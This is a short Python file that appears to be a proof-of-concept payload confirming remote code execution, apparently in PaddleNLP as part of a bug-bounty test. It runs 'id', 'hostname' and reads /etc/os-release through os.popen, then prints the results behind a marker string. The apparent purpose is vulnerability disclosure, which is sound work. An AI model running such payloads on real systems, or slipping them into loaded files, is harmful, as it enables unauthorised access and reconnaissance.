# bsrc-s1-rce-test
import os
print("bsrc-s1-paddlenlp-rce-" + os.popen("id && hostname && cat /etc/os-release 2>/dev/null | head -3").read().strip())
